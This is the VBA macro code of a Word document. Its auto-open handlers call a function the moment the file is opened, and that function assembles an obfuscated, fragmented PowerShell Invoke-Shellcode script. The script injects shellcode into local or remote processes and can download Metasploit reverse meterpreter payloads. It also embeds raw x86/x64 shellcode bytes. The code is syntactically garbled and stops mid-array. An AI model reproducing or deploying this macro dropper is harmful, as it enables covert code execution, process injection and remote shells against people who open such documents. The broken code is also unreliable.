Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Sub Auto_Open()
    viJy
End Sub

Sub AutoOpen()
    viJy
End Sub

Sub Document_Open()
    viJy
End Sub

Public Function viJy() As Variant
    Dim YYVA As String
    YYVA = "function Invoke-Shellcode"
{
[CmdletBinding( Defa"
    YYVA = YYVA + "ultParameterSetName = 'RunLocal', SupportsShouldPr"
    YYVA = YYVA + "ocess = $True , ConfirmImpact = 'High')] Param ("
"
    YYVA = YYVA + "    [ValidateNotNullOrEmpty()]"
    [UInt16]
    "
    YYVA = YYVA + "$ProcessID,"
    [Parameter( ParameterSetName = 'R"
    YYVA = YYVA + "unLocal' )]"
    [ValidateNotNullOrEmpty()]
    ["
    YYVA = YYVA + "Byte[]]"
    $Shellcode,
    [Parameter( Paramete"
    YYVA = YYVA + "rSetName = 'Metasploit' )]"
    [ValidateSet( 'win"
    YYVA = YYVA + "dows/meterpreter/reverse_http',"
                 "
    YYVA = YYVA + " 'windows/meterpreter/reverse_https',"
           "
    YYVA = YYVA + "       IgnoreCase = $True )]"
    [String]
    $P"
    YYVA = YYVA + "ayload = 'windows/meterpreter/reverse_http',"
    "
    YYVA = YYVA + "[Parameter( ParameterSetName = 'ListPayloads' )]"
"
    YYVA = YYVA + "    [Switch]"
    $ListMetasploitPayloads,
    [P"
    YYVA = YYVA + "arameter( Mandatory = $True,"
                Para ""
    YYVA = YYVA + "meterSetName = 'Metasploit' )]"
    [ValidateNotNu"
    YYVA = YYVA + "llOrEmpty()]"
    [String]
    $Lhost = '127.0.0."
    YYVA = YYVA + "1',"
    [Parameter( Mandatory = $True,
         "
    YYVA = YYVA + "       ParameterSetName = 'Metasploit' )]"
    [Va"
    YYVA = YYVA + "lidateRange( 1,65535 )]"
    [Int]
    $Lport = 8"
    YYVA = YYVA + "443,"
    [Parameter( ParameterSetName = 'Metasplo"
    YYVA = YYVA + "it' )]"
    [ValidateNotNull()]
    [String]
   "
    YYVA = YYVA + " $UserAgent = (Get-ItemProperty -Path 'HKCU:\Softw"
    YYVA = YYVA + "are\Microsoft\Windows\CurrentVersion\Internet Sett"
    YYVA = YYVA + "ings').'User Agent',"
    [Parameter( ParameterSet"
    YYVA = YYVA + "Name = 'Metasploit' )]"
    [ValidateNotNull()]
 "
    YYVA = YYVA + "   [Switch]"
    $Legacy = $False,
    [Parameter"
    YYVA = YYVA + "( ParameterSetName = 'Metasploit' )]"
    [Validat"
    YYVA = YYVA + "eNotNull()]"
    [Switch]
    $Proxy = $False,
 "
    YYVA = YYVA + "   [Switch]"
    $Force = $False
)
    Set-Stric"
    YYVA = YYVA + "tMode -Version 2.0"
    if ($PsCmdlet.ParameterSet"
    YYVA = YYVA + "Name -eq 'ListPayloads')"
    {
        $Availabl"
    YYVA = YYVA + "ePayloads = (Get-Command Invoke-Shellcode).Paramet"
    YYVA = YYVA + "ers['Payload'].Attributes |"
            Where-Obj"
    YYVA = YYVA + "ect {$_.TypeId -eq [System.Management.Automation.V"
    YYVA = YYVA + "alidateSetAttribute]}"
        foreach ($Payload i"
    YYVA = YYVA + "n $AvailablePayloads.ValidValues)"
        {
    "
    YYVA = YYVA + "        New-Object PSObject -Property @{ Payloads "
    YYVA = YYVA + "= $Payload }"
        }
        Return
    }
  "
    YYVA = YYVA + "  if ( $PSBoundParameters['ProcessID'] )"
    {
 "
    YYVA = YYVA + "       Get-Process -Id $ProcessID -ErrorAction Sto"
    YYVA = YYVA + "p | Out-Null"
    }
    function Local:Get-Delega"
    YYVA = YYVA + "teType"
    {
        Param
        (
         "
    YYVA = YYVA + "   [OutputType([Type])]"
            [Parameter( P"
    YYVA = YYVA + "osition = 0)]"
            [Type[]]
            $"
    YYVA = YYVA + "Parameters = (New-Object Type[](0)),"
            "
    YYVA = YYVA + "[Parameter( Position = 1 )]"
            [Type]
 "
    YYVA = YYVA + "           $ReturnType = [Void]"
        )
      "
    YYVA = YYVA + "  $Domain = [AppDomain]::CurrentDomain"
        $D"
    YYVA = YYVA + "ynAssembly = New-Object System.Reflection.Assembly"
    YYVA = YYVA + "Name('ReflectedDelegate')"
        $AssemblyBuilde"
    YYVA = YYVA + "r = $Domain.DefineDynamicAssembly($DynAssembly, [S"
    YYVA = YYVA + "ystem.Reflection.Emit.AssemblyBuilderAccess]::Run)"
    YYVA = YYVA + ""
        $ModuleBuilder = $AssemblyBuilder.Define"
    YYVA = YYVA + "DynamicModule('InMemoryModule', $false)"
        $"
    YYVA = YYVA + "TypeBuilder = $ModuleBuilder.DefineType('MyDelegat"
    YYVA = YYVA + "eType', 'Class, Public, Sealed, AnsiClass, AutoCla"
    YYVA = YYVA + "ss', [System.MulticastDelegate])"
        $Constru"
    YYVA = YYVA + "ctorBuilder = $TypeBuilder.DefineConstructor('RTSp"
    YYVA = YYVA + "ecialName, HideBySig, Public', [System.Reflection."
    YYVA = YYVA + "CallingConventions]::Standard, $Parameters)"
     "
    YYVA = YYVA + "   $ConstructorBuilder.SetImplementationFlags('Run"
    YYVA = YYVA + "time, Managed')"
        $MethodBuilder = $TypeBui"
    YYVA = YYVA + "lder.DefineMethod('Invoke', 'Public, HideBySig, Ne"
    YYVA = YYVA + "wSlot, Virtual', $ReturnType, $Parameters)"
      "
    YYVA = YYVA + "  $MethodBuilder.SetImplementationFlags('Runtime, "
    YYVA = YYVA + "Managed')"
        Write-Output $TypeBuilder.Creat"
    YYVA = YYVA + "eType()"
    }
    function Local:Get-ProcAddress"
    YYVA = YYVA + ""
    {
        Param
        (
            [Ou"
    YYVA = YYVA + "tputType([IntPtr])]"
            [Parameter( Posit"
    YYVA = YYVA + "ion = 0, Mandatory = $True )]"
            [String"
    YYVA = YYVA + "]"
            $Module,
            [Parameter( P"
    YYVA = YYVA + "osition = 1, Mandatory = $True )]"
            [St"
    YYVA = YYVA + "ring]"
            $Procedure
        )
        "
    YYVA = YYVA + "$SystemAssembly = [AppDomain]::CurrentDomain.GetAs"
    YYVA = YYVA + "semblies() |"
            Where-Object { $_.Global"
    YYVA = YYVA + "AssemblyCache -And $_.Location.Split('\\')[-1].Equ"
    YYVA = YYVA + "als('System.dll') }"
        $UnsafeNativeMethods "
    YYVA = YYVA + "= $SystemAssembly.GetType('Microsoft.Win32.UnsafeN"
    YYVA = YYVA + "ativeMethods')"
        $GetModuleHandle = $Unsafe"
    YYVA = YYVA + "NativeMethods.GetMethod('GetModuleHandle')"
      "
    YYVA = YYVA + "  $GetProcAddress = $UnsafeNativeMethods.GetMethod"
    YYVA = YYVA + "('GetProcAddress')"
        $Kern32Handle = $GetMo"
    YYVA = YYVA + "duleHandle.Invoke($null, @($Module))"
        $tmp"
    YYVA = YYVA + "Ptr = New-Object IntPtr"
        $HandleRef = New-"
    YYVA = YYVA + "Object System.Runtime.InteropServices.HandleRef($t"
    YYVA = YYVA + "mpPtr, $Kern32Handle)"
        Write-Output $GetPr"
    YYVA = YYVA + "ocAddress.Invoke($null, @([System.Runtime.InteropS"
    YYVA = YYVA + "ervices.HandleRef]$HandleRef, $Procedure))"
"   }
    YYVA = YYVA + ""
    function Local:Emit-CallThreadStub ([IntPtr] "
    YYVA = YYVA + "$BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Archit"
    YYVA = YYVA + "ecture)"
    {
        $IntSizePtr = $Architectur"
    YYVA = YYVA + "e / 8"
        function Local:ConvertTo-LittleEndi"
    YYVA = YYVA + "an ([IntPtr] $Address)"
        {
            $Li"
    YYVA = YYVA + "ttleEndianByteArray = New-Object Byte[](0)"
      "
    YYVA = YYVA + "      $Address.ToString("X$($IntSizePtr*2)") -spli"
    YYVA = YYVA + "t '([A-F0-9]{2})' | ForEach-Object { if ($_) { $Li"
"   YYVA = YYVA + "ttleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
    YYVA = YYVA + ""
            [System.Array]::Reverse($LittleEndian"
    YYVA = YYVA + "ByteArray)"
            Write-Output $LittleEndian"
    YYVA = YYVA + "ByteArray"
        }
        $CallStub = New-Obje"
    YYVA = YYVA + "ct Byte[](0)"
        if ($IntSizePtr -eq 8)
    "
    YYVA = YYVA + "    {"
            [Byte[]] $CallStub = 0x48,0xB8 "
    YYVA = YYVA + "                     # MOV   QWORD RAX, &shellcode"
    YYVA = YYVA + ""
            $CallStub += ConvertTo-LittleEndian "
    YYVA = YYVA + "$BaseAddr       # &shellcode"
            $CallStu"
    YYVA = YYVA + "b += 0xFF,0xD0                              # CALL"
    YYVA = YYVA + "  RAX"
            $CallStub += 0x6A,0x00         "
    YYVA = YYVA + "                     # PUSH  BYTE 0"
            $"
    YYVA = YYVA + "CallStub += 0x48,0xB8                             "
    YYVA = YYVA + " # MOV   QWORD RAX, &ExitThread"
            $Call"
    YYVA = YYVA + "Stub += ConvertTo-LittleEndian $ExitThreadAddr # &"
    YYVA = YYVA + "ExitThread"
            $CallStub += 0xFF,0xD0    "
    YYVA = YYVA + "                          # CALL  RAX"
        }
"
    YYVA = YYVA + "        else"
        {
            [Byte[]] $Cal"
    YYVA = YYVA + "lStub = 0xB8                           # MOV   DWO"
    YYVA = YYVA + "RD EAX, &shellcode"
            $CallStub += Conve"
    YYVA = YYVA + "rtTo-LittleEndian $BaseAddr       # &shellcode"
  "
    YYVA = YYVA + "          $CallStub += 0xFF,0xD0                  "
    YYVA = YYVA + "            # CALL  EAX"
            $CallStub += "
    YYVA = YYVA + "0x6A,0x00                              # PUSH  BYT"
    YYVA = YYVA + "E 0"
            $CallStub += 0xB8                "
"   YYVA = YYVA + "                   # MOV   DWORD EAX, &ExitThread
    YYVA = YYVA + ""
            $CallStub += ConvertTo-LittleEndian $"
    YYVA = YYVA + "ExitThreadAddr # &ExitThread"
            $CallStu"
    YYVA = YYVA + "b += 0xFF,0xD0                              # CALL"
    YYVA = YYVA + "  EAX"
        }
        Write-Output $CallStub
"
    YYVA = YYVA + "    }"
    function Local:Inject-RemoteShellcode ("
    YYVA = YYVA + "[Int] $ProcessID)"
    {
        $hProcess = $Ope"
    YYVA = YYVA + "nProcess.Invoke(0x001F0FFF, $false, $ProcessID) # "
    YYVA = YYVA + "ProcessAccessFlags.All (0x001F0FFF)"
        if (!"
    YYVA = YYVA + "$hProcess)"
        {
            Throw "Unable t"
    YYVA = YYVA + "o open a process handle for PID: $ProcessID"
    "
    YYVA = YYVA + "    }"
        $IsWow64 = $false
        if ($64b"
    YYVA = YYVA + "itCPU) # Only perform theses checks if CPU is 64-b"
    YYVA = YYVA + "it"
        {
            $IsWow64Process.Invoke("
    YYVA = YYVA + "$hProcess, [Ref] $IsWow64) | Out-Null"
           "
    YYVA = YYVA + " if ((!$IsWow64) -and $PowerShell32bit)"
         "
    YYVA = YYVA + "   {"
                Throw 'Unable to inject 64-b"
    YYVA = YYVA + "it shellcode from within 32-bit Powershell. Use th"
    YYVA = YYVA + "e 64-bit version of Powershell if you want this to"
    YYVA = YYVA + " work.'"
            }
            elseif ($IsWow"
    YYVA = YYVA + "64) # 32-bit Wow64 process"
            {
       "
    YYVA = YYVA + "         if ($Shellcode32.Length -eq 0)"
         "
    YYVA = YYVA + "       {"
                    Throw 'No shellcode "
    YYVA = YYVA + "was placed in the $Shellcode32 variable!'"
       "
    YYVA = YYVA + "         }"
                $Shellcode = $Shellcod"
    YYVA = YYVA + "e32"
            }
            else # 64-bit proc"
    YYVA = YYVA + "ess"
            {
                if ($Shellcode"
    YYVA = YYVA + "64.Length -eq 0)"
                {
             "
    YYVA = YYVA + "       Throw 'No shellcode was placed in the $Shel"
    YYVA = YYVA + "lcode64 variable!'"
                }
           "
    YYVA = YYVA + "     $Shellcode = $Shellcode64"
            }
   "
    YYVA = YYVA + "     }"
        else # 32-bit CPU
        {
    "
    YYVA = YYVA + "        if ($Shellcode32.Length -eq 0)"
          "
    YYVA = YYVA + "  {"
                Throw 'No shellcode was place"
    YYVA = YYVA + "d in the $Shellcode32 variable!'"
            }
 "
    YYVA = YYVA + "           $Shellcode = $Shellcode32"
        }
 "
    YYVA = YYVA + "       $RemoteMemAddr = $VirtualAllocEx.Invoke($hP"
    YYVA = YYVA + "rocess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3"
    YYVA = YYVA + "000, 0x40) # (Reserve|Commit, RWX)"
        if (!$"
    YYVA = YYVA + "RemoteMemAddr)"
        {
            Throw "Unab"
    YYVA = YYVA + "le to allocate shellcode memory in PID: $ProcessID"
    YYVA = YYVA + ""
        }
        $WriteProcessMemory.Invoke($"
    YYVA = YYVA + "hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.L"
    YYVA = YYVA + "ength, [Ref] 0) | Out-Null"
        $ExitThreadAdd"
    YYVA = YYVA + "r = Get-ProcAddress kernel32.dll ExitThread"
     "
    YYVA = YYVA + "   if ($IsWow64)"
        {
            $CallStub"
    YYVA = YYVA + " = Emit-CallThreadStub $RemoteMemAddr $ExitThreadA"
    YYVA = YYVA + "ddr 32"
        }
        Else
        {
      "
    YYVA = YYVA + "      $CallStub = Emit-CallThreadStub $RemoteMemAd"
    YYVA = YYVA + "dr $ExitThreadAddr 64"
        }
        $RemoteS"
    YYVA = YYVA + "tubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPt"
    YYVA = YYVA + "r]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reser"
    YYVA = YYVA + "ve|Commit, RWX)"
        if (!$RemoteStubAddr)
  "
    YYVA = YYVA + "      {"
            Throw "Unable to allocate thr"
    YYVA = YYVA + "ead call stub memory in PID: $ProcessID"
        "
    YYVA = YYVA + "}"
        $WriteProcessMemory.Invoke($hProcess, $"
    YYVA = YYVA + "RemoteStubAddr, $CallStub, $CallStub.Length, [Ref]"
    YYVA = YYVA + " 0) | Out-Null"
        $ThreadHandle = $CreateRem"
    YYVA = YYVA + "oteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $Re"
    YYVA = YYVA + "moteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)"
"
    YYVA = YYVA + "        if (!$ThreadHandle)"
        {
          "
    YYVA = YYVA + "  Throw "Unable to launch remote thread in PID: $P"
    YYVA = YYVA + "rocessID"
        }
        $CloseHandle.Invoke("
    YYVA = YYVA + "$hProcess) | Out-Null"
    }
    function Local:I"
    YYVA = YYVA + "nject-LocalShellcode"
    {
        if ($PowerShe"
    YYVA = YYVA + "ll32bit) {"
            if ($Shellcode32.Length -e"
    YYVA = YYVA + "q 0)"
            {
                Throw 'No she"
    YYVA = YYVA + "llcode was placed in the $Shellcode32 variable!'"
"
    YYVA = YYVA + "                return"
            }
           "
    YYVA = YYVA + " $Shellcode = $Shellcode32"
        }
        els ""
    YYVA = YYVA + "e"
        {
            if ($Shellcode64.Length "
    YYVA = YYVA + "-eq 0)"
            {
                Throw 'No s"
    YYVA = YYVA + "hellcode was placed in the $Shellcode64 variable!'"
    YYVA = YYVA + ""
                Return
            }
         "
    YYVA = YYVA + "   $Shellcode = $Shellcode64"
        }
        $"
    YYVA = YYVA + "BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero,"
    YYVA = YYVA + " $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|C"
    YYVA = YYVA + "ommit, RWX)"
        if (!$BaseAddress)
        {"
    YYVA = YYVA + ""
            Throw "Unable to allocate shellcode "
    YYVA = YYVA + "memory in PID: $ProcessID"
        }
        [Sy"
    YYVA = YYVA + "stem.Runtime.InteropServices.Marshal]::Copy($Shell"
    YYVA = YYVA + "code, 0, $BaseAddress, $Shellcode.Length)"
       "
    YYVA = YYVA + " $ExitThreadAddr = Get-ProcAddress kernel32.dll Ex"
    YYVA = YYVA + "itThread"
        if ($PowerShell32bit)
        {"
    YYVA = YYVA + ""
            $CallStub = Emit-CallThreadStub $Bas"
    YYVA = YYVA + "eAddress $ExitThreadAddr 32"
        }
        el ""
    YYVA = YYVA + "se"
        {
            $CallStub = Emit-CallTh"
    YYVA = YYVA + "readStub $BaseAddress $ExitThreadAddr 64"
        "
    YYVA = YYVA + "}"
        $CallStubAddress = $VirtualAlloc.Invoke"
    YYVA = YYVA + "([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x4"
    YYVA = YYVA + "0) # (Reserve|Commit, RWX)"
        if (!$CallStub"
    YYVA = YYVA + "Address)"
        {
            Throw "Unable to "
    YYVA = YYVA + "allocate thread call stub."
        }
        [S"
    YYVA = YYVA + "ystem.Runtime.InteropServices.Marshal]::Copy($Call"
    YYVA = YYVA + "Stub, 0, $CallStubAddress, $CallStub.Length)"
    "
    YYVA = YYVA + "    $ThreadHandle = $CreateThread.Invoke([IntPtr]:"
    YYVA = YYVA + ":Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntP"
    YYVA = YYVA + "tr]::Zero)"
        if (!$ThreadHandle)
        {"
    YYVA = YYVA + ""
            Throw "Unable to launch thread."
  "
    YYVA = YYVA + "      }"
        $WaitForSingleObject.Invoke($Thre"
    YYVA = YYVA + "adHandle, 0xFFFFFFFF) | Out-Null"
        $Virtual"
    YYVA = YYVA + "Free.Invoke($CallStubAddress, $CallStub.Length + 1"
    YYVA = YYVA + ", 0x8000) | Out-Null # MEM_RELEASE (0x8000)"
     "
    YYVA = YYVA + "   $VirtualFree.Invoke($BaseAddress, $Shellcode.Le"
    YYVA = YYVA + "ngth + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000"
    YYVA = YYVA + ")"
    }
    $IsWow64ProcessAddr = Get-ProcAddres"
    YYVA = YYVA + "s kernel32.dll IsWow64Process"
    if ($IsWow64Pro"
    YYVA = YYVA + "cessAddr)"
    {
        $IsWow64ProcessDelegate "
    YYVA = YYVA + "= Get-DelegateType @([IntPtr], [Bool].MakeByRefTyp"
    YYVA = YYVA + "e()) ([Bool])"
        $IsWow64Process = [System.R"
    YYVA = YYVA + "untime.InteropServices.Marshal]::GetDelegateForFun"
    YYVA = YYVA + "ctionPointer($IsWow64ProcessAddr, $IsWow64ProcessD"
    YYVA = YYVA + "elegate)"
        $64bitCPU = $true
    }
    el ""
    YYVA = YYVA + "se"
    {
        $64bitCPU = $false
    }
    "
    YYVA = YYVA + "if ([IntPtr]::Size -eq 4)"
    {
        $PowerSh"
    YYVA = YYVA + "ell32bit = $true"
    }
    Else
    {
        "
    YYVA = YYVA + "$PowerShell32bit = $false"
    }
    if ($PsCmdle"
    YYVA = YYVA + "t.ParameterSetName -eq 'Metasploit')"
    {
     "
    YYVA = YYVA + "   if (!$PowerShell32bit) {"
            $RootInvo"
    YYVA = YYVA + "cation = $MyInvocation.Line"
            $Response"
    YYVA = YYVA + " = $True"
            if ( $Force -or ( $Response "
    YYVA = YYVA + "= $psCmdlet.ShouldContinue( "Do you want to launch"
    YYVA = YYVA + " the payload from x86 Powershell?",
             "
    YYVA = YYVA + "      "Attempt to execute 32-bit shellcode from 64"
    YYVA = YYVA + "-bit Powershell. Note: This process takes about on"
    YYVA = YYVA + "e minute. Be patient! You will also see some artif"
    YYVA = YYVA + "acts of the script loading in the other process." "
    YYVA = YYVA + ") ) ) { }"
            if ( !$Response )
        "
    YYVA = YYVA + "    {"
                Return
            }
    "
    YYVA = YYVA + "        if ($MyInvocation.BoundParameters['Force']"
    YYVA = YYVA + ")"
            {
                $Command = "func"
    YYVA = YYVA + "tion $($MyInvocation.InvocationName) {`n" + $MyInv"
    YYVA = YYVA + "ocation.MyCommand.ScriptBlock + "`n}`n$($RootInvoc"
    YYVA = YYVA + "ation)`n`n"
            }
            Else
    "
    YYVA = YYVA + "        {"
                $Command = "function $("
    YYVA = YYVA + "$MyInvocation.InvocationName) {`n" + $MyInvocation"
    YYVA = YYVA + ".MyCommand.ScriptBlock + "`n}`n$($RootInvocation) "
    YYVA = YYVA + "-Force`n`n"
            }
            $CommandBy"
    YYVA = YYVA + "tes = [System.Text.Encoding]::Ascii.GetBytes($Comm"
    YYVA = YYVA + "and)"
            $EncodedCommand = [Convert]::ToB"
    YYVA = YYVA + "ase64String($CommandBytes)"
            $Execute ="
    YYVA = YYVA + " '$Command' + " | $Env:windir\SysWOW64\WindowsPowe"
"   YYVA = YYVA + "rShell\v1.0\powershell.exe -NoProfile -Command -"
    YYVA = YYVA + ""
            Invoke-Expression -Command $Execute |"
    YYVA = YYVA + " Out-Null"
            Return
        }
        "
    YYVA = YYVA + "$Response = $True"
        if ( $Force -or ( $Resp"
    YYVA = YYVA + "onse = $psCmdlet.ShouldContinue( "Do you know what"
    YYVA = YYVA + " you're doing?",
               "About to downloa"
    YYVA = YYVA + "d Metasploit payload '$($Payload)' LHOST=$($Lhost)"
    YYVA = YYVA + ", LPORT=$($Lport)" ) ) ) { }
        if ( !$Respo"
    YYVA = YYVA + "nse )"
        {
            Return
        }
 "
    YYVA = YYVA + "       switch ($Payload)"
        {
            '"
    YYVA = YYVA + "windows/meterpreter/reverse_http'"
            {
"
    YYVA = YYVA + "                $SSL = ''"
            }
        "
    YYVA = YYVA + "    'windows/meterpreter/reverse_https'"
         "
    YYVA = YYVA + "   {"
                $SSL = 's'
                "
    YYVA = YYVA + "[System.Net.ServicePointManager]::ServerCertificat"
    YYVA = YYVA + "eValidationCallback = {$True}"
            }
    "
    YYVA = YYVA + "    }"
        if ($Legacy)
        {
         "
    YYVA = YYVA + "   $Request = "http$($SSL)://$($Lhost):$($Lport)/I"
    YYVA = YYVA + "NITM"
        } else {
            $CharArray = "
    YYVA = YYVA + "48..57 + 65..90 + 97..122 | ForEach-Object {[Char]"
    YYVA = YYVA + "$_}"
            $SumTest = $False
            wh ""
    YYVA = YYVA + "ile ($SumTest -eq $False) "
            {
       "
    YYVA = YYVA + "         $GeneratedUri = $CharArray | Get-Random -"
    YYVA = YYVA + "Count 4"
                $SumTest = (([int[]] $Gen"
    YYVA = YYVA + "eratedUri | Measure-Object -Sum).Sum % 0x100 -eq 9"
    YYVA = YYVA + "2)"
            }
            $RequestUri = -join"
    YYVA = YYVA + " $GeneratedUri"
            $Request = "http$($SSL"
    YYVA = YYVA + ")://$($Lhost):$($Lport)/$($RequestUri)"
        "
    YYVA = YYVA + "}"
        $Uri = New-Object Uri($Request)
      "
    YYVA = YYVA + "  $WebClient = New-Object System.Net.WebClient"
  "
    YYVA = YYVA + "      $WebClient.Headers.Add('user-agent', "$UserA"
    YYVA = YYVA + "gent")
        if ($Proxy)
        {
          "
    YYVA = YYVA + "  $WebProxyObject = New-Object System.Net.WebProxy"
    YYVA = YYVA + ""
            $ProxyAddress = (Get-ItemProperty -P"
    YYVA = YYVA + "ath 'HKCU:\Software\Microsoft\Windows\CurrentVersi"
    YYVA = YYVA + "on\Internet Settings').ProxyServer"
            if"
    YYVA = YYVA + " ($ProxyAddress) "
            {
                "
    YYVA = YYVA + "$WebProxyObject.Address = $ProxyAddress"
         "
    YYVA = YYVA + "       $WebProxyObject.UseDefaultCredentials = $Tr"
    YYVA = YYVA + "ue"
                $WebClientObject.Proxy = $WebP"
    YYVA = YYVA + "roxyObject"
            }
        }
"       try
    YYVA = YYVA + ""
        {
            [Byte[]] $Shellcode32 = $W"
    YYVA = YYVA + "ebClient.DownloadData($Uri)"
        }
        ca ""
    YYVA = YYVA + "tch"
        {
            Throw "$($Error[0].Exc"
    YYVA = YYVA + "eption.InnerException.InnerException.Message)"
  "
    YYVA = YYVA + "      }"
        [Byte[]] $Shellcode64 = $Shellcod"
    YYVA = YYVA + "e32"
    }
    elseif ($PSBoundParameters['Shellc"
    YYVA = YYVA + "ode'])"
    {
        [Byte[]] $Shellcode32 = $Sh"
    YYVA = YYVA + "ellcode"
        [Byte[]] $Shellcode64 = $Shellcod"
    YYVA = YYVA + "e32"
    }
    Else
    {
        [Byte[]] $She"
    YYVA = YYVA + "llcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x"
    YYVA = YYVA + "89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,"
     "
    YYVA = YYVA + "                             0x52,0x0c,0x8b,0x52,0"
    YYVA = YYVA + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
    YYVA = YYVA + "x31,0xc0,"
0                                  xac , ""
    YYVA = YYVA + "0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,"
    YYVA = YYVA + "0xc7,0xe2,0xf0,0x52,0x57,"
                       "
    YYVA = YYVA + "           0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0"
    YYVA = YYVA + ",0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,"
       "
    YYVA = YYVA + "                           0xd0,0x50,0x8b,0x48,0x1"
    YYVA = YYVA + "8,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x3"
    YYVA = YYVA + "4,0x8b,"
                                  0x01,0x"
    YYVA = YYVA + "d6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0x"
    YYVA = YYVA + "c7,0x38,0xe0,0x75,0xf4,"
                         "
    YYVA = YYVA + "         0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0"
    YYVA = YYVA + "x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,"
         "
    YYVA = YYVA + "                         0x0c,0x4b,0x8b,0x58,0x1c,"
    YYVA = YYVA + "0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,"
    YYVA = YYVA + "0x24,"
                                  0x5b,0x5b"
    YYVA = YYVA + ",0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b"
    YYVA = YYVA + ",0x12,0xeb,0x86,0x5d,"
                           "
    YYVA = YYVA + "       0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x5"
    YYVA = YYVA + "0,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,"
           "
    YYVA = YYVA + "                       0xbb,0xe0,0x1d,0x2a,0x0a,0x"
    YYVA = YYVA + "68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x"
    YYVA = YYVA + "0a,"
                                  0x80,0xfb,0"
    YYVA = YYVA + "xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0"
    YYVA = YYVA + "x53,0xff,0xd5,0x63,"
                             "
    YYVA = YYVA + "     0x61,0x6c,0x63,0x00)"
        [Byte[]] $Shell"
    YYVA = YYVA + "code64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00"
    YYVA = YYVA + ",0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,"
       "
    YYVA = YYVA + "                           0x56,0x48,0x31,0xd2,0x6"
    YYVA = YYVA + "5,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8"
    YYVA = YYVA + "b,0x52,"
                                  0x20,0x"
    YYVA = YYVA + "48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x"
    YYVA = YYVA + "31,0xc9,0x48,0x31,0xc0,"
                         "
    YYVA = YYVA + "         0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0"
    YYVA = YYVA + "xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,"
         "
    YYVA = YYVA + "                         0x52,0x41,0x51,0x48,0x8b,"
    YYVA = YYVA + "0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,"
    YYVA = YYVA + "0x88,"
                                  0x00,0x00"
    YYVA = YYVA + ",0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50"
    YYVA = YYVA + ",0x8b,0x48,0x18,0x44,"
                           "
    YYVA = YYVA + "       0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x4"
    YYVA = YYVA + "8,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,"
           "
    YYVA = YYVA + "                       0x01,0xd6,0x4d,0x31,0xc9,0x"
    YYVA = YYVA + "48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0x"
    YYVA = YYVA + "c1,"
                                  0x38,0xe0,0"
    YYVA = YYVA + "x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0"
    YYVA = YYVA + "x75,0xd8,0x58,0x44,"
                             "
    YYVA = YYVA + "     0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,"
    YYVA = YYVA + "0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,"
             "
    YYVA = YYVA + "                     0x01,0xd0,0x41,0x8b,0x04,0x88"
    YYVA = YYVA + ",0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a"
    YYVA = YYVA + ","
                                  0x41,0x58,0x4"
    YYVA = YYVA + "1,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xf"
    YYVA = YYVA + "f,0xe0,0x58,0x41,"
                               "
    YYVA = YYVA + "   0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0x"
    YYVA = YYVA + "ff,0x5d,0x48,0xba,0x01,0x00,0x00,"
               "
    YYVA = YYVA + "                   0x00,0x00,0x00,0x00,0x00,0x48,0"
"   YYVA = YYVA + "x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
    YYVA = YYVA + ""
                                  0x6f,0x87,0xff,"
    YYVA = YYVA + "0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,"
    YYVA = YYVA + "0xbd,0x9d,0xff,"
                                 "
